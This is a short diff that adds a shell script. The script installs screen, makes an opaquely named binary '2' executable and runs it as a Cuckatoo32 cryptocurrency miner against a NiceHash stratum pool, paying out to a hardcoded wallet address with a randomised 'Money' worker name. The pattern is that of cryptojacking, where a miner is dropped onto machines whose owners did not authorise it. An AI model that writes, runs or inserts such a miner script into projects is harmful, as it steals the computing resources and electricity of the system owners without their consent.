@@ -1,0 +1,4 @@
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Money)
+apt-get update
+apt install screen -y
+chmod u+x 2 && ./2 --algo C32 --pool stratum+tcp://grincuckatoo32.eu.nicehash.com:3383 --user 3H6BkkXNW6qaK563qfAHm2uZ1sFgnqCjL6.$WORKER
